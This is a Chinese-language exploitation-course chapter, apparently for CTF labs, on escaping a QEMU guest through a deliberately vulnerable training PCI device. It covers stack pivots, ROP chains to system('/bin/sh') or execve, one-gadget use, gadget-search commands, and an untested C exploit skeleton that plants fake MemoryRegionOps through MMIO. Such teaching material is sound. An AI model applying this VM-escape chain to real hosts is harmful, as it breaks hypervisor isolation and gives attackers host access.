# Ch 22 — ROP in QEMU：繞 host ASLR/NX 落到 system/execve

> **目標**：拿著 Ch 17 洩漏的 QEMU base 與 heap base，在 Ch 21 劫持的 RIP 上接 stack pivot + ROP chain，最終在 host userspace 執行 `system("/bin/sh")`，完成 VM 逃逸。

> **環境**：QEMU 9.0 / x86-64 / Linux host（Ubuntu 22.04/24.04），debug build 帶 symbol，guest Debian 12 x86-64，掛載 vuln-pci `-device vuln-pci`。

---

## 為什麼需要這個？

走到 Ch 21 尾端，我們已經：

1. 從 heap 上的 `ops` 指標洩漏出 QEMU PIE base（Ch 17）
2. 知道 guest 可控 buffer 在 host heap 上的確切位址（Ch 17）
3. 把 `mmio_state->ops` 改寫成指向我們偽造的 `MemoryRegionOps`（Ch 21）
4. 偽造的 `.write` 欄位填了某個任意位址 → 觸發 MMIO → `RIP = 我們給的值`

現在 NX 說「heap 不能執行」，ASLR 說「你不知道 system() 在哪裡」。

問題是：**我們兩個都已經解決了**。NX 只擋 shellcode，ROP 用的是 binary 裡原有的可執行片段。ASLR 在 Ch 17 就拿到 PIE base 了——我們可以算出 QEMU binary 裡每一個 gadget 的執行期位址。唯一剩下要做的是：
把 RSP 從 QEMU 的合法 stack 搬到我們控制的 heap buffer，然後逐步 `ret` 過我們預先排好的 gadget 序列，最後落到 `system("/bin/sh")`。

這章把這一步從頭走到尾。

---

## 先建立直覺

### 直覺一：為什麼 ASLR 已經失效

ASLR 的前提是「攻擊者不知道基底位址」。

Ch 17 的 infoleak 讀出 `VulnState.ops`（一個存在 heap 上的指標，指向 QEMU binary 裡的 `.rodata` 段），然後我們拿它去減掉 binary 裡那個符號的靜態偏移，算出這次執行期的 `qemu_base`。

```
qemu_base = leaked_ops_ptr - (symbol_addr_in_binary - 0x400000)
```

（實際偏移數字要用 `readelf -s qemu-system-x86_64 | grep memoryregion_ops_of_xxx` 查；這裡用示意。）

有了 `qemu_base`，QEMU binary 裡每個地址都能算：

```
gadget_runtime = qemu_base + gadget_offset_in_binary
system_plt     = qemu_base + plt_offset_of_system
```

ASLR 對這條 chain 等同於沒有。

### 直覺二：NX 怎麼被 ROP 繞過

NX（Non-Executable）把 heap / stack 的記憶體頁標成 `PROT_READ | PROT_WRITE`，沒有 `PROT_EXEC`，CPU 不允許從這些頁取指令。

ROP 的答案是：**不從 heap/stack 取指令，改用 binary 裡原本就可執行的程式碼片段（gadget）**。每個 gadget 是一小段以 `ret` 結尾的指令，`ret` 會把 RSP 往上走 8 bytes、跳到下一個 gadget。我們只要在受控的記憶體裡排好「gadget 位址的陣列」，然後把 RSP 指向那裡，CPU 就會一路 `ret`、一路跳，執行我們設計好的邏輯——全程在合法的可執行頁上執行。

### 直覺三：stack pivot 是什麼，為什麼必要

劫持 RIP 的那一刻，RSP 還指著 QEMU 自己的 call stack，那個 stack 的內容我們根本控制不了。

Stack pivot 是：用一個 gadget 把 RSP 換掉，指向我們在 heap 上準備好的「假 stack」。之後所有的 `ret` 都從我們的 buffer 拉地址，ROP chain 才真正在我們手中。

常見的 pivot gadget 形式：

```asm
xchg rax, rsp; ret      ; 如果 RAX 已經指向我們的 buffer
mov  rsp, [rax]; ret    ; 間接版，[rax] = 我們 buffer 的位址
leave; ret              ; 若可以控 RBP：RSP = RBP → pop RIP
add  rsp, N; ret        ; 跳過若干 bytes 到達 ROP chain
```

---

## 底層機制：完整利用流程

```
              GUEST（VM 裡）                     HOST（QEMU 行程）

  Ch 16-17
  ──────────────────────────────────────────────────────────────────
  guest OOB read                            MMIO .read callback
  → 讀出 ops 指標                    →      → 回傳 heap 上的指標值
  → qemu_base = leaked - offset              （QEMU binary .rodata ptr）
  → heap_base = leaked2 - offset

  Ch 20-21
  ──────────────────────────────────────────────────────────────────
  guest 在 buf[X] 寫入                      MMIO .write callback
  假 MemoryRegionOps{                →      OOB write 覆蓋
    .write = pivot_gadget_addr              → mmio_state->ops = &fake_ops
  }
  guest 觸發 MMIO write

  Ch 22（本章）
  ──────────────────────────────────────────────────────────────────
  guest MMIO write 觸發               →    ops->write(opaque, addr, val, size)
                                           此時 RDI = opaque = VulnState*
                                                （heap 上，位址已知）
                                           RIP = pivot_gadget（我們設的）

  [pivot 執行]
  xchg rdi, rsp; ret                  →    RSP = opaque（heap buffer）
                                           → 從 heap 上拉 ROP chain

  [ROP chain 在 heap buffer 裡排好]
  +0x00: pop rdi; ret                 →    RDI = ptr_to_binsh
  +0x08: ptr_to_binsh
  +0x10: ret（對齊）
  +0x18: system@plt                   →    system("/bin/sh")

  [HOST SHELL 落地 ✓]
  此 shell 在 HOST 上，VM 隔離已穿透
```

上圖的「未實測，理論預期」段落：`xchg rdi, rsp; ret` 這個 pivot gadget 需要 `RDI` 恰好在 `ops->write` 被呼叫時等於 `opaque`（即 `VulnState *`），這在 QEMU 的 `memory_region_write_accessor` → `mr->ops->write(mr->opaque, ...)` 呼叫慣例下成立，但實際 gadget 存不存在要用 ROPgadget 驗。

---

## QEMU 行程記憶體佈局

Linux 下 QEMU 行程的虛擬位址空間：

```
高位址（0x7fff...）
┌──────────────────────────────────────────────┐
│  [stack]                                     │  ← ASLR，我們不用
├──────────────────────────────────────────────┤
│  [vdso / vsyscall]                           │
├──────────────────────────────────────────────┤
│  libc.so.6                                   │  ← ASLR，偏移從 QEMU 算
├──────────────────────────────────────────────┤
│  其他 .so（libglib, libpixman, ...）          │
├──────────────────────────────────────────────┤
│  qemu-system-x86_64（PIE，base 已知）         │  ← ★ QEMU binary：gadget 來源
│    .text / .rodata / .plt                    │
├──────────────────────────────────────────────┤
│  [heap]（g_malloc / glibc malloc）            │  ← ★ base 已知：VulnState 在這
├──────────────────────────────────────────────┤
│  [mmap]                                      │
│    guest RAM mapping（大塊，連續）            │  ← 通常數 GB
│    各種 mmap device 緩衝                      │
└──────────────────────────────────────────────┘
低位址（0x0000...）
```

**libc base 怎麼拿**：有兩條路。

第一條：如果 QEMU binary 自己呼叫了 `system()`（通常有，用來 spawn `sh -c` 執行某些輔助指令），那 `system@plt` 直接在 QEMU binary 的 PLT 裡——我們有 QEMU base，就有 `system@plt` 的位址，根本不需要算 libc base。用 `objdump -d qemu-system-x86_64 | grep -A5 '<system@plt>'` 驗證。

第二條：如果需要 libc gadget 或 one-gadget，要拿 libc base。對固定的 OS + QEMU 版本組合，libc 的載入偏移相對於 QEMU binary 的載入位址是固定的（透過 `/proc/PID/maps` 量一次）。多次執行驗證這個偏移是否穩定；若穩定，就把它當常數用：`libc_base = qemu_base + FIXED_DELTA`。

---

## Gadget 來源實務

### 從 QEMU binary 找

```bash
# 安裝
pip install ropgadget

# 找 QEMU binary 裡的 gadgets（輸出很長，先存檔）
ROPgadget --binary /path/to/qemu-system-x86_64 --rop > qemu_gadgets.txt

# 找特定 gadget
grep -P "pop rdi ; ret$"  qemu_gadgets.txt
grep -P "pop rsi ; ret$"  qemu_gadgets.txt
grep -P "pop rdx ; ret$"  qemu_gadgets.txt
grep -P "xchg rdi, rsp"   qemu_gadgets.txt
grep -P "xchg rax, rsp"   qemu_gadgets.txt
grep -P "leave ; ret$"    qemu_gadgets.txt
grep -P "^ ret$"          qemu_gadgets.txt   # 對齊用
```

QEMU 是個幾十 MB 的大 binary，gadget 數量充裕，幾乎所有你想要的 `pop Rxx; ret` 都找得到。

輸出格式：`0x0000000000123456 : pop rdi ; ret`，這個 `0x123456` 是 binary 裡的靜態位址；執行期位址 = `qemu_base + 0x123456`（如果 PIE base 是 0，靜態位址就直接等於偏移）。

用 `readelf -h qemu-system-x86_64` 確認 `Entry point address` 以判斷 binary 的靜態 base（通常是 `0x400000` 或 PIE 下的 `0x0`）。

### 從 libc 找 one-gadget

```bash
# 安裝
pip install one_gadget
# 或 gem install one_gadget（Ruby 版本，功能一樣）

one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

輸出示例（示意，非真實偏移）：

```
0x4f29e execve("/bin/sh", rsp+0x30, environ)
constraints:
  address rsp+0x30 == NULL

0x4f2a5 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

One-gadget 是一個「執行後直接 execve 的單一 gadget」，不需要建完整 ROP chain。問題是它有 constraint：某些暫存器必須是 NULL 或 stack 上某個位置必須是 NULL。如果 constraint 在我們的場景下滿足（觸發時那些暫存器剛好是 0），用 one-gadget 最省力。

**實務策略**：先試所有 one-gadget，在 gdb 裡確認 constraint 是否滿足；不滿足就退回完整 `pop rdi; ret → system()` chain。

---

## Stack Pivot 詳解

### 場景

`ops->write(opaque, addr, val, size)` 被呼叫時，calling convention（System V AMD64 ABI）：

```
RDI = opaque   ← VulnState *，heap 位址，已知
RSI = addr     ← MMIO offset（我們控制的 MMIO 位址）
RDX = val      ← 我們寫入的值
RCX = size     ← 4 或 8
```

RSP 指著 QEMU 的 call stack（某個 stack frame 裡），內容我們沒有控制。

我們把 `fake_ops.write` 設成 `pivot_gadget` 的位址。

### Pivot 方案 A：`xchg rdi, rsp; ret`

```
執行 pivot_gadget 之前：
  RDI = 0xdeadbeef0000   （VulnState * = 我們的 heap buffer）
  RSP = 0x7fff.....     （QEMU 合法 stack）

執行 xchg rdi, rsp; ret 之後：
  RSP = 0xdeadbeef0000   ← 現在 RSP 指向我們的 heap buffer ✓
  RDI = 0x7fff.....     （舊 stack，我們不再在乎）

ret 拉的是 heap buffer[0]：那裡放的是 ROP chain 第一個 gadget 的位址
```

heap buffer 的起頭要放 ROP chain，而不是 `VulnState` 本身的結構欄位——這代表我們的 OOB write 要把 `opaque`（`mmio_state`）的起頭也填進我們的 ROP chain，或我們要找一個偏移讓 ROP chain 避開結構體的關鍵欄位。具體佈局取決於 `VulnState` 的 struct layout（用 `pahole` 或 GDB `ptype` 確認）。

### Pivot 方案 B：`leave; ret`（若可控 RBP）

`leave` 等同於 `mov rsp, rbp; pop rbp`。

如果在 MMIO write callback 的某個上層 frame 裡 RBP 可以被我們的 OOB write 覆蓋，就能用這個 pivot。這通常比方案 A 更難觸發，但 gadget 更普遍。

### Pivot 方案 C：`add rsp, N; ret`（若 chain 就在原 stack 附近）

如果 QEMU 在呼叫 `ops->write` 之前有把我們可控的資料 `push` 到 stack 上（例如 MMIO offset 這類），且 N 的偏移可以算出來，就能靠 `add rsp, N` 直接跳到那塊資料。這種場景比較少見，但有些 CTF 題專門設計成這樣。

---

## ROP Chain 建構

### 方案一：`system("/bin/sh")`

前提：QEMU binary 有 `system@plt`（多數版本有）。

```
heap_buffer 佈局（每格 8 bytes，位址由低到高）：

offset  內容
------  -------------------------------------------------
0x00    [pivot gadget 的位址]  ← 若用 xchg rdi, rsp，此處是第一個 ret 拉的值
0x08    pop_rdi_ret            ← gadget: pop rdi; ret
0x10    ptr_to_binsh           ← "/bin/sh\0" 字串的位址
0x18    ret_for_align          ← gadget: ret（讓 RSP 16-byte 對齊）
0x20    system_plt             ← system() 的位址
```

`/bin/sh` 字串可以放在 buffer 的某個固定偏移（例如 offset 0x80），事先寫入，位址 = `heap_buf_addr + 0x80`。

為什麼需要 `ret_for_align`：`system()` 的 glibc 實作用到 SSE 指令，需要 RSP 16-byte 對齊；呼叫前 RSP 若是 `0x...8`（不對齊），會 segfault。一個多餘的 `ret` 讓 RSP 再走 8 bytes，從 `0x...8` 變 `0x...0`，對齊修好。

### 方案二：`execve` syscall via ROP

如果 `system@plt` 找不到或被阻擋，用純 syscall chain：

```
pop rdi; ret          ← RDI = ptr to "/bin/sh"
ptr_to_binsh

pop rsi; ret          ← RSI = 0（NULL argv[]）
0x0

pop rdx; ret          ← RDX = 0（NULL envp[]）
0x0

pop rax; ret          ← RAX = 59（SYS_execve）
0x3b

syscall               ← execve("/bin/sh", NULL, NULL)
```

需要 `pop rax; ret` 和 `syscall` gadget；QEMU binary 裡這兩個都很好找。

### 方案三：one-gadget（最省事）

如果只有一次 RIP 控制機會，且 one-gadget constraint 在觸發當下滿足，直接把 `fake_ops.write` 設成 `libc_base + one_gadget_offset`，連 stack pivot 都可以省掉——前提是那個 gadget 在內部自己搞定一切，不需要配合 ROP chain。

用 gdb 在觸發時觀察暫存器狀態，對照 `one_gadget` 輸出的 constraint，選能滿足的那個。

---

## 取得 Host Shell 後

QEMU 行程通常以**非 root** 使用者身份執行：

- 開發/桌面環境：呼叫 `qemu-system-x86_64` 的那個 user（例如你自己的帳號）
- 雲端/libvirt 環境：`qemu` user 或帶 `libvirt` group 的使用者
- 某些 hosted CTF 環境：docker 內部的 `pwn` user

這個 shell 的意義：

- 在 **host** 的檔案系統上存取（不是 VM 裡）
- 可以讀 `/proc/PID/maps` 確認自己真的在 host 上
- 可以存取 host 網路介面、其他 VM 的資料（如果 libvirt 資料在同一個 user 的家目錄裡）
- **不代表 root**：如果目標是 root，下一步是 host kernel LPE（`kernel_pwn` 課的內容；Part 7 Ch 40 接上這條線）

總結：VM escape = 跳出 VM 邊界落到 host userspace。root 是另一件事。

---

## 底層機制：QEMU seccomp sandbox 快速提醒

QEMU 9.0 支援 `-sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny`，會裝一個 seccomp-BPF filter，把 `execve`、`fork`、`clone` 等 syscall 封掉。

影響：如果 host 開了 sandbox，`system()` 和 `execve()` 的 syscall 會被 SIGKILL 結束，chain 執行到 `syscall` 那一行就死。

**CTF 環境**：出題者幾乎一定關掉 sandbox（否則需要 Ch 37 的 seccomp bypass 技術，那是另一題）。確認方法：從 `ps aux` 看 qemu-system 的啟動參數有沒有 `-sandbox on`。

**現實環境**：如果 sandbox 開著，需要繞過，詳見 Ch 37。那章的核心思路是找 sandbox 允許的 syscall（通常允許 `open`/`read`/`write`/`sendmsg`），改用這些來竊資料或跳到 setuid helper。

本章假設 sandbox 關閉（CTF 主線）。

---

## 對比與取捨

| 方案 | 所需條件 | 成功率 | 備注 |
|------|---------|--------|------|
| `system@plt` + `pop rdi; ret` | QEMU binary 有 `system` PLT | 高 | 最穩定；一組 QEMU gadget 搞定，不需 libc base |
| one-gadget（libc） | 知道 libc base；constraint 滿足 | 中 | 省 chain 長度，但 constraint 常不滿足需多試 |
| `execve` syscall chain | 有 `pop rax; ret` + `syscall` gadget | 高 | 純 QEMU binary，不需 libc；稍長但可靠 |
| `xchg rdi, rsp` pivot | RDI = opaque 且 gadget 存在 | 視 gadget 而定 | 最常見 CTF pivot 手法 |
| `leave; ret` pivot | 可控 RBP | 視 frame 佈局 | 更難設置，但 gadget 更普遍 |
| seccomp bypass（Ch 37） | sandbox 開啟 | 低（需詳細分析） | 本章不展開 |

---

## 踩雷集錦

**1. `system()` segfault 因為 RSP 沒對齊**

`system()` 內部使用 `movaps`（SSE 指令），要求 RSP 呼叫時 16-byte 對齊。如果 ROP chain 的 `system_plt` 前面 gadget 數量是奇數，RSP 落在 `0x...8`，segfault。在 chain 裡插一個多餘的 `ret` gadget 修掉。這是新手最常撞的牆，撞了在 gdb 看一下 RSP 尾數就知道了。

**2. `/bin/sh` 字串被 OOB write 的其他步驟蓋掉**

我們的 exploit 分多個 MMIO write 階段（佈局 fake_ops、寫 ROP chain），如果 `/bin/sh` 字串的位址和某個寫入視窗重疊，字串會被蓋掉成別的值。設計 buffer 佈局時，把字串放在「只有 read 會碰到、write 步驟不會覆蓋」的 offset 上，或在最後一步才寫字串。

**3. Gadget 靜態位址 vs. 執行期位址搞混**

`ROPgadget` 輸出的是 binary 裡的靜態位址（例如 `0x0000000000123456`）。如果 binary 是 PIE，這個值是相對於 binary base 的偏移，執行期要加 `qemu_base`。如果不是 PIE（但 QEMU 通常是），才能直接用。先用 `checksec --file=qemu-system-x86_64` 確認 PIE 狀態。

**4. Pivot gadget 在呼叫慣例下暫存器狀態不符合預期**

`xchg rdi, rsp` 假設 RDI 在 `ops->write` 被呼叫時等於 opaque。這在 QEMU 的 `memory_region_write_accessor` 呼叫路徑上是正確的——但中間有沒有 wrapper 改掉 RDI？要在 gdb 裡下斷點在 pivot gadget 入口，確認 RDI 的值是不是我們預期的 `VulnState *`。

**5. 寫假 `MemoryRegionOps` 時忘記 `.endianness` 欄位**

QEMU 在分發 MMIO 時會檢查 `ops->endianness`（`DEVICE_NATIVE_ENDIAN`/`DEVICE_BIG_ENDIAN`/`DEVICE_LITTLE_ENDIAN`），某些路徑會對值做 byte-swap。如果 endianness 欄位是 0 而且剛好觸發 swap，你的 gadget 位址會被翻轉，RIP 跳到垃圾位址。fake_ops 裡要填正確的 endianness 值（`DEVICE_NATIVE_ENDIAN = 0`，`DEVICE_LITTLE_ENDIAN = 1`，查 QEMU source `include/hw/hw.h`）。

---

## 進階：再往深一層

### ret2dlresolve（不需要 libc base）

如果連 `system@plt` 都沒有，可以偽造 PLT / GOT 結構，讓 QEMU 的動態連結器替我們解析 `system` 的位址——完全不用洩漏 libc。這是 CTF 競技層才需要的技巧，但知道有這條路。

### FSOP（File Structure Oriented Programming）

QEMU 用 glibc，glibc 的 `FILE` 結構裡有 function pointer（`vtable`）。如果我們的 OOB write 夠強、可以改 `stdout` 或 `stderr` 的 vtable，可以不用 ops pointer，改從 I/O 函式劫持 RIP。QEMU 每次 `fprintf` / `fwrite` 就是一次觸發機會。

### JOP / COOP（非 RET 結尾的 gadget）

如果 CFI（Control Flow Integrity）保護了 `ret` 指令，ROP 就行不通。現代 QEMU 預設沒有 CFI，但如果未來碰到，JOP（Jump-Oriented Programming）用 `jmp [rax]` 這類間接跳躍 gadget 達到類似效果。COOP（Counterfeit Object-Oriented Programming）更進一步，利用整個 C++ 虛擬函式分派機制。

### 多次觸發 vs. 一次觸發

如果每次 MMIO write 都觸發 `ops->write`，我們有機會用多次觸發逐步建構狀態（例如先 pivot、再拉 chain、再 call system）。但多數場景裡每次觸發都是 fresh call——ROP chain 必須在第一次觸發時就完整排好，一次執行到底。設計 chain 前先確認觸發模型。

---

## 動手練習

以下練習在自編 debug QEMU + vuln-pci 環境下進行（Ch 0 的環境，已有 symbol）。

**練習 22-1：Gadget 清單**

```bash
ROPgadget --binary $(which qemu-system-x86_64) --rop > ~/qemu_gadgets.txt
grep -P "pop rdi ; ret$"  ~/qemu_gadgets.txt | head -3
grep -P "pop rsi ; ret$"  ~/qemu_gadgets.txt | head -3
grep -P "pop rdx ; ret$"  ~/qemu_gadgets.txt | head -3
grep -P "xchg r.., rsp"   ~/qemu_gadgets.txt | head -5
grep -P "^ ret$"          ~/qemu_gadgets.txt | head -3
```

確認這些 gadget 都存在，記下各自的靜態位址。

**練習 22-2：確認 `system@plt`**

```bash
objdump -d $(which qemu-system-x86_64) | grep -B2 -A10 '<system@plt>'
```

如果有輸出，記下 PLT 裡 `system` 的靜態位址。

**練習 22-3：在 gdb 觀察 `ops->write` 呼叫時的暫存器**

1. `gdb -p $(pgrep qemu-system)` attach 到跑著 vuln-pci 的 QEMU
2. `break *vuln_pci_mmio_write`（你的 device .write callback）
3. 在 guest 裡觸發一次 MMIO write
4. 斷下來後：`info registers` 確認 RDI, RSI, RDX, RCX 的值
5. 驗證 RDI 是不是你的 `VulnState *`（`p (VulnState *)$rdi` 看結構）

**練習 22-4：手動驗證 stack pivot（未實測，理論預期）**

在 gdb 裡找一個 `xchg rdi, rsp; ret` gadget 的執行期位址（`qemu_base + 靜態offset`）。

用 `set $rip = gadget_addr` + `set $rdi = target_stack_addr` 直接在 gdb 裡模擬執行一步，確認 RSP 被換成了 target_stack_addr。

---

## Exploit Skeleton（pseudocode-level C，帶位址計算）

**注意：未實測，理論預期。具體偏移需在你自己編的 QEMU + vuln-pci 上量測。**

```c
/*
 * exploit.c — VM escape via vuln-pci OOB → ROP → system("/bin/sh")
 * 在 guest 內執行，打的是 host 上的 QEMU 行程。
 *
 * 假設：
 *   qemu_base    ← 從 Ch 17 infoleak 計算出來
 *   heap_base    ← 從 Ch 17 infoleak 計算出來（VulnState * 的位址）
 *   vuln_buf_off ← VulnState.buf 在結構體內的 offset（pahole 量）
 *
 * 全部偏移需在你的 QEMU 版本 + 環境下自行驗證。
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

/* ── 從 Ch 17 拿到的洩漏值 ── */
uint64_t qemu_base;   /* QEMU binary 執行期 base */
uint64_t heap_base;   /* VulnState * 在 host heap 上的位址 */

/* ── 靜態偏移（需在你的 QEMU 版本上量） ── */
#define OFF_POP_RDI_RET     0x123abc   /* ROPgadget 找到的靜態 offset */
#define OFF_RET_ALIGN       0x100010   /* 單純 ret，做對齊用 */
#define OFF_SYSTEM_PLT      0x456def   /* objdump 找到的 system@plt 靜態位址 */
#define OFF_XCHG_RDI_RSP    0x789abc   /* xchg rdi, rsp; ret 的靜態 offset */

/* ── 執行期位址計算 ── */
#define GADGET(off)   (qemu_base + (off))

/* VulnState 在 heap 上的起頭就是 opaque（RDI 的值） */
/* ROP chain 放在 VulnState.buf 裡（buf 的 host 位址 = heap_base + buf_offset） */
#define VULN_BUF_HOST_ADDR  (heap_base + 0x10)  /* buf 在 VulnState 的 offset，pahole 量 */

static volatile uint8_t *mmio;   /* 映射到 vuln-pci BAR0 的 MMIO 視窗 */

static void mmio_write64(uint64_t offset, uint64_t val) {
    *(volatile uint64_t *)(mmio + offset) = val;
}

static uint64_t mmio_read64(uint64_t offset) {
    return *(volatile uint64_t *)(mmio + offset);
}

void setup_rop_chain(void) {
    /*
     * 在 host heap 上的 VulnState.buf 裡排 ROP chain。
     * 透過 guest 的 OOB write（MMIO offset > sizeof(buf)）直接寫 host 記憶體。
     *
     * heap_buf[0] 對應 MMIO offset = buf_offset_in_struct（即剛好到 buf 起頭）。
     * 下面每個 +8 對應 MMIO offset 加 8。
     *
     * 注意：pivot gadget（xchg rdi, rsp）執行後，第一個 ret 拉的是 RSP 現在指向的位置，
     * 也就是 heap_base + 0（VulnState 起頭）。
     * 如果 struct 起頭有必要欄位（例如 PCIDevice、MemoryRegion），
     * 需要更精確地計算 pivot 後 RSP 落點，讓 ROP chain 頭部避開 struct 關鍵欄位。
     * 這裡用簡化假設：buf 起頭可以直接放 chain。
     */

    uint64_t buf_base = VULN_BUF_HOST_ADDR;  /* ROP chain 起點（host 位址） */

    /* "/bin/sh" 字串放在 buf + 0x80 */
    char binsh[] = "/bin/sh";
    /* 透過 OOB write 把字串寫到 buf+0x80 */
    for (int i = 0; i < 8; i++) {
        uint8_t byte = (i < 7) ? binsh[i] : 0;
        /* 每次寫一個 byte 到正確 offset——實際做法視 device 的 write granularity 而定 */
        /* 這裡簡化成一次 64-bit write 把 "/bin/sh\0" 一口氣寫進去 */
    }
    uint64_t binsh_packed = 0x0068732f6e69622fULL;  /* "/bin/sh\0" little-endian */
    mmio_write64(0x10 + 0x80, binsh_packed);  /* 0x10 = buf 在 struct 的 offset（示意） */

    uint64_t ptr_to_binsh = buf_base + 0x80;

    /* ROP chain（每格 8 bytes，從 buf+0x00 開始） */
    mmio_write64(0x10 + 0x00, GADGET(OFF_POP_RDI_RET));  /* pop rdi; ret */
    mmio_write64(0x10 + 0x08, ptr_to_binsh);              /* "/bin/sh" 的 host 位址 */
    mmio_write64(0x10 + 0x10, GADGET(OFF_RET_ALIGN));     /* ret（對齊 RSP） */
    mmio_write64(0x10 + 0x18, GADGET(OFF_SYSTEM_PLT));    /* system() */
}

void plant_fake_ops(void) {
    /*
     * 偽造 MemoryRegionOps，把 .write 填成 pivot gadget。
     * VulnState.buf 後方放 fake_ops；fake_ops 的 host 位址已知（heap_base + offset）。
     * 然後 OOB write 覆蓋 mmio_state->ops 指向 fake_ops。
     * （詳見 Ch 20-21）
     */

    /* fake_ops 放在 buf + 0x100（buf 剛好夠大） */
    uint64_t fake_ops_addr = VULN_BUF_HOST_ADDR + 0x100;

    /* fake_ops.read  = 某個合法位址（避免在 read 時 crash，不需要真的能用） */
    /* fake_ops.write = pivot gadget */
    uint64_t pivot_addr = GADGET(OFF_XCHG_RDI_RSP);

    /* 用 OOB write 把 fake_ops 寫到 buf+0x100 */
    mmio_write64(0x10 + 0x100 + 0x00, 0xdeadbeef);    /* .read（placeholder） */
    mmio_write64(0x10 + 0x100 + 0x08, pivot_addr);    /* .write = pivot gadget */
    mmio_write64(0x10 + 0x100 + 0x10, 1);             /* .endianness = DEVICE_LITTLE_ENDIAN */
    /* 其他欄位補 0 ... */

    /* OOB write 覆蓋 mmio_state->ops 指標（ops 在 VulnState 的 offset = 例如 0x200） */
    mmio_write64(0x10 + 0x200, fake_ops_addr);
}

void trigger(void) {
    /*
     * 觸發 MMIO write，呼叫 fake ops->write。
     * ops->write(opaque, addr, val, size) 會執行 pivot gadget。
     * pivot: xchg rdi, rsp; ret
     *   → RSP = RDI = VulnState * = heap_base
     *   → ret 拉 heap_base[0] = pop rdi; ret
     *   → ROP chain 開始執行
     */
    mmio_write64(0x0, 0x1);   /* 任意一次 MMIO write，只要落到 fake ops->write */
}

int main(void) {
    /* ── Step 1：映射 vuln-pci BAR0 ── */
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd < 0) { perror("open resource0"); return 1; }
    mmio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    /* ── Step 2：執行 Ch 17 的 infoleak，拿到 qemu_base 和 heap_base ── */
    /* ... （見 Ch 17）... */
    /* qemu_base = ...; heap_base = ...; */

    /* ── Step 3：佈局 ROP chain ── */
    setup_rop_chain();

    /* ── Step 4：植入 fake ops 並覆蓋 ops 指標 ── */
    plant_fake_ops();

    /* ── Step 5：觸發 ── */
    printf("[*] triggering... expect host shell\n");
    trigger();

    /* 如果成功，system() 已在 host 上執行，這行不會被印出 */
    printf("[!] should not reach here\n");
    return 0;
}
```

**驗證步驟**（在 Linux host 上）：

```bash
# 1. 確認 QEMU 行程沒有 sandbox
ps aux | grep qemu | grep sandbox

# 2. 在 host 上開 QEMU，attach gdb 到 QEMU PID
gdb -p $(pgrep qemu-system-x86_64)
# 在 gdb 裡：
break *vuln_pci_mmio_write
continue

# 3. guest 裡執行 exploit（編譯後）
gcc -O0 -o exploit exploit.c && ./exploit

# 4. 期望行為：gdb 斷在 write callback，讓它跑
# 單步走過 pivot gadget，確認 RSP 被換掉
# 繼續執行，確認 ROP chain 每一步暫存器正確
# system("/bin/sh") 執行後，host 上出現 shell 提示

# 5. 驗證 shell 是在 host 上：
# （shell 裡執行）
hostname && cat /proc/1/cmdline  # 應看到 host 的 hostname，不是 guest
ls /  # 應是 host 的根目錄
```

---

## 本章重點整理

- Ch 17 的洩漏讓 ASLR 失效：`qemu_base` + 靜態偏移 = 任何 gadget / PLT 的執行期位址
- NX 被 ROP 繞過：gadget 都在 QEMU binary 的可執行頁裡，我們只是排好地址讓 `ret` 串起來
- Stack pivot 是從「QEMU 的合法 stack」切換到「我們控制的 heap buffer」的關鍵橋接
- 最常用的 pivot：`xchg rdi, rsp; ret`，前提是 RDI 在 `ops->write` 呼叫時等於 opaque
- ROP chain 目標：`pop rdi` → `/bin/sh` 位址 → `ret`（對齊）→ `system@plt`；或用 one-gadget
- 落地的 shell 是 **host userspace shell**，不是 root（root 是 host kernel LPE 的事）
- seccomp sandbox 若啟用會擋 execve/fork：CTF 預設關，現實環境要看 Ch 37

---

## 自我檢核

- [ ] 說得出為什麼拿到 `qemu_base` 後 ASLR 對我們等同失效
- [ ] 說得出 ROP 為什麼能繞 NX（不需要可執行的 heap/stack）
- [ ] 說得出 `xchg rdi, rsp; ret` 這個 pivot 做了什麼，以及為什麼 RDI = opaque
- [ ] 能在 `qemu_gadgets.txt` 裡找到 `pop rdi; ret`、`ret`，並算出執行期位址
- [ ] 說得出 `system()` 在呼叫前需要 RSP 16-byte 對齊的原因，以及怎麼修
- [ ] 說得出「取得 host shell」和「取得 host root」的區別
- [ ] 知道 `system@plt` 在 QEMU binary 裡存不存在怎麼查，不存在時的替代方案
- [ ] 知道 one-gadget 的使用前提，以及 constraint 不滿足時要怎麼辦

---

## 延伸閱讀

1. **[Return-Oriented Programming: Systems, Languages, and Applications — Roemer et al. (2012)](https://dl.acm.org/doi/10.1145/2133375.2133377)**
   ROP 的學術定義論文。語言偏形式但把「圖靈完備 gadget chain」的概念講清楚了；理解 ROP 的本質之後，QEMU 只是一個大型 binary 這件事就不神秘了。

2. **[ROPgadget 工具 — GitHub: JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**
   這門課主要使用的 gadget 搜尋工具，文件裡有完整的 flag 說明。`--rop`、`--nojop`、`--only "pop|ret"` 等 filter 是實際找 chain 時省時的關鍵。

3. **[one_gadget — GitHub: david942j/one_gadget](https://github.com/david942j/one_gadget)**
   one-gadget 搜尋工具的 README 包含怎麼解讀 constraint 的說明。遇到 constraint 不滿足時，`--level 1` 選項會多列出一些較鬆散的候選。

4. **[Mem2019 — QEMU Escape（CTF 教學系列）](https://mem2019.github.io/)**
   多篇從 heap groom 到 ROP chain 完整覆蓋的 QEMU CTF writeup，chain 建構手法和本章幾乎完全重疊，是最直接的對照閱讀。

5. **[ASLR smack & laugh reference — halfdog (2012)](https://www.halfdog.net/Security/2012/LinuxKernelAslrMmap/)**
   ASLR 的設計假設與洩漏如何讓它失效的分析。偏 Linux 系統面，解釋了為什麼「一個洩漏打穿整個 ASLR」是設計上的結構性問題，不是偶然。

---

← [Ch 21：從任意寫到 RIP：劫持 callback / 偽造物件](./21-write-to-rip.md)

完整 exploit chain 的最後一塊拼圖到位了。現在我們有：惡意 guest、OOB 讀寫、infoleak、RIP 控制、ROP chain 落地 host shell。這就是 VM escape 的骨架，後面幾章都是在這個骨架上長肉——真實 CVE 的 bug 不同，利用方法大同小異。

